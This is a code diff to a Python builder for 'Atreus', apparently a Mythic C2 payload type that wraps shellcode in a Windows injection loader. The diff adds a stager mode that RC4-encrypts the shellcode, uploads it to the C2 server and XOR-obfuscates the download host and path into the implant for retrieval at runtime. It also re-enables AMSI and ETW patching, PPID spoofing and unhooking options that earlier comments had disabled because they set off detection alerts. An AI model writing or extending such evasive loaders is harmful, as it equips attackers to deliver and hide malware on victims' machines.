@@ -45,8 +45,8 @@ class Atreus(PayloadType):
         BuildParameter(
             name="encryption_type",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Payload encoding/encryption: uuid = UUID fuscation (low entropy, no key), rc4/xor = encrypted bytes, none = plaintext",
-            choices=["uuid", "rc4", "xor", "none"],
+            description="Payload encoding/encryption: stager = download payload at runtime (low entropy), uuid = UUID fuscation, rc4/xor = encrypted bytes, none = plaintext",
+            choices=["stager", "uuid", "rc4", "xor", "none"],
             default_value="uuid",
         ),
         BuildParameter(
@@ -54,6 +54,13 @@ class Atreus(PayloadType):
             parameter_type=BuildParameterType.String,
             description="Encryption key (leave empty for random 16-byte key)",
             default_value="",
+            required=False,
+        ),
+        BuildParameter(
+            name="mythic_host",
+            parameter_type=BuildParameterType.String,
+            description="Stager mode only: IP/hostname of the Mythic server (used to download the shellcode at runtime)",
+            default_value="198.51.100.6",
             required=False,
         ),
         BuildParameter(
@@ -95,9 +102,9 @@ class Atreus(PayloadType):
         BuildParameter(
             name="injection_technique",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe), Module Stomp (NtCreateSection+NtMapViewOfSection into combase.dll, fiber execution)",
-            choices=["self_injection", "fiber_injection", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing", "module_stomp"],
-            default_value="module_stomp",
+            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
+            choices=["self_injection", "fiber_injection", "module_stomping", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing"],
+            default_value="early_bird_apc",
         ),
         BuildParameter(
             name="wipe_memory",
@@ -124,16 +131,17 @@ class Atreus(PayloadType):
             resp.error_message = "No payload received from Kratos builder"
             return resp
 
-        enc_type = "uuid"  # forced UUID
+        enc_type = (self.get_parameter("encryption_type") or "uuid").strip()
         enc_key_param    = (self.get_parameter("encryption_key") or "").strip()
+        mythic_host_param = (self.get_parameter("mythic_host") or "198.51.100.6").strip()
         target_process   = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
-        ppid_spoof       = False  # disabled: triggers "API Call from Spoofed Parent"
-        use_unhook       = False  # disabled: test without first
-        use_etw_patch    = False  # disabled: triggers AMSI/ETW bypass alerts
-        use_amsi_patch   = False  # disabled: triggers AMSI bypass alerts
+        ppid_spoof       = self.get_parameter("ppid_spoof") or False
+        use_unhook       = self.get_parameter("use_unhook") or False
+        use_etw_patch    = self.get_parameter("use_etw_patch") or False
+        use_amsi_patch   = self.get_parameter("use_amsi_patch") or False
         use_sandbox      = self.get_parameter("use_sandbox_check") or False
-        injection_technique = self.get_parameter("injection_technique") or "module_stomp"
-        wipe_memory      = True  # forced
+        injection_technique = self.get_parameter("injection_technique") or "early_bird_apc"
+        wipe_memory      = self.get_parameter("wipe_memory") or False
         debug_mode       = self.get_parameter("debug_mode") or False
 
         # Generate key (unused for uuid mode)
@@ -143,6 +151,7 @@ class Atreus(PayloadType):
         # Encode/encrypt payload
         orig_size = len(payload_bytes)
         if enc_type == "uuid":
+            # Pad to multiple of 16
             padded = payload_bytes
             remainder = len(padded) % 16
             if remainder:
@@ -176,7 +185,18 @@ class Atreus(PayloadType):
             payload_size   = str(orig_size)
             rc4_key_bytes  = "0x00"
             xor_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
+        elif enc_type == "stager":
+            logging.error(f"[ATREUS-DEBUG] enc_type=stager detected, payload_size={orig_size}")
+            # Stager: payload NOT embedded - registered in Mythic and downloaded at runtime
+            payload_hex    = "0x00"  # inside #else branch, not compiled with USE_STAGER
+            uuid_count     = "0"
+            payload_size   = str(orig_size)
+            rc4_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
+            xor_key_bytes  = "0x00"
+            stager_encrypted = _rc4(key_bytes, payload_bytes)
+            logging.error(f"[ATREUS-DEBUG] stager RC4 key: {key_bytes.hex()}, encrypted size: {len(stager_encrypted)}")
         else:
+            logging.error(f"[ATREUS-DEBUG] enc_type={enc_type} -> plaintext fallback")
             payload_hex    = ", ".join(f"0x{b:02x}" for b in payload_bytes)
             uuid_count     = "0"
             payload_size   = str(orig_size)
@@ -200,6 +220,38 @@ class Atreus(PayloadType):
         src = src.replace("%XOR_KEY_BYTES%",    xor_key_bytes)
         src = src.replace("%TARGET_PROCESS_W%", target_wchar)
 
+        # Stager: upload encrypted payload to Mythic, derive download URL automatically
+        if enc_type == "stager":
+            from mythic_container.MythicRPC import SendMythicRPCFileCreate, MythicRPCFileCreateMessage
+            rpc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+                PayloadUUID=self.uuid,
+                FileContents=stager_encrypted,
+                Filename="kratos_stager.bin",
+                DeleteAfterFetch=False,
+                Comment="Atreus stager RC4-encrypted shellcode",
+            ))
+            if not rpc_resp.Success:
+                resp.error_message = f"MythicRPC FileCreate failed: {rpc_resp.Error}"
+                return resp
+            file_id = rpc_resp.AgentFileId
+            _mythic_host = mythic_host_param
+            _mythic_port = 7443
+            _stager_path = f"/direct/download/{file_id}"
+            _xk = random.getrandbits(8)
+            _henc = ", ".join(f"0x{b ^ _xk:02x}" for b in _mythic_host.encode('ascii'))
+            _penc = ", ".join(f"0x{b ^ _xk:02x}" for b in _stager_path.encode('ascii'))
+            logging.error(f"[ATREUS-DEBUG] stager file_id={file_id} host={_mythic_host} port={_mythic_port} path={_stager_path}")
+            src = src.replace("%STAGER_HOST_ENC%", _henc)
+            src = src.replace("%STAGER_PORT%",     str(_mythic_port))
+            src = src.replace("%STAGER_PATH_ENC%", _penc)
+            src = src.replace("%STAGER_XOR_KEY%",  f"0x{_xk:02x}")
+        else:
+            src = src.replace("%STAGER_HOST_ENC%", "0x00")
+            src = src.replace("%STAGER_PORT%",     "9090")
+            src = src.replace("%STAGER_PATH_ENC%", "0x00")
+            src = src.replace("%STAGER_XOR_KEY%",  "0x00")
+        logging.error(f"[ATREUS-DEBUG] enc_type={repr(enc_type)}")
+
         # Build defines
         defines = []
         if enc_type == "uuid":
@@ -208,6 +260,9 @@ class Atreus(PayloadType):
             defines.append("-DUSE_RC4")
         elif enc_type == "xor":
             defines.append("-DUSE_XOR")
+        elif enc_type == "stager":
+            defines.append("-DUSE_STAGER")
+            logging.error("[ATREUS-DEBUG] -DUSE_STAGER added")
         if ppid_spoof:
             defines.append("-DUSE_PPID_SPOOF")
         if use_unhook:
@@ -228,7 +283,7 @@ class Atreus(PayloadType):
             defines.append("-DUSE_SELF_INJECT")
         elif injection_technique == "fiber_injection":
             defines.append("-DUSE_FIBER_INJECT")
-        elif injection_technique == "module_stomp":
+        elif injection_technique == "module_stomping":
             defines.append("-DUSE_MODULE_STOMP")
         if wipe_memory:
             defines.append("-DUSE_WIPE")
@@ -288,13 +343,23 @@ class Atreus(PayloadType):
                 elif injection_technique == "remote_injection":  features.append("remote-injection")
                 elif injection_technique == "self_injection":    features.append("self-injection")
                 elif injection_technique == "fiber_injection":   features.append("fiber-injection")
+                elif injection_technique == "module_stomping":   features.append("module-stomping")
                 else:                                            features.append("early-bird-apc")
                 if wipe_memory:      features.append("wipe")
                 if debug_mode:       features.append("DEBUG")
-                resp.message = (
-                    f"Atreus [{', '.join(features)}] -> {target_process}\n"
-                    f"[DBG] raw_param={repr(raw_inj)} resolved={repr(injection_technique)}\n"
-                    f"[DBG] defines={' '.join(defines)}"
-                )
+                if enc_type == "stager":
+                    resp.message = (
+                        f"Atreus [{', '.join(features)}] -> {target_process}\n"
+                        f"STAGER: https://{_mythic_host}:{_mythic_port}{_stager_path}\n"
+                        f"RC4 key (hex): {key_bytes.hex()}\n"
+                        f"Encrypted payload size: {len(stager_encrypted)} bytes (registered in Mythic)\n"
+                        f"[DBG] defines={' '.join(defines)}"
+                    )
+                else:
+                    resp.message = (
+                        f"Atreus [{', '.join(features)}] -> {target_process}\n"
+                        f"[DBG] raw_param={repr(raw_inj)} resolved={repr(injection_technique)}\n"
+                        f"[DBG] defines={' '.join(defines)}"
+                    )
 
         return resp
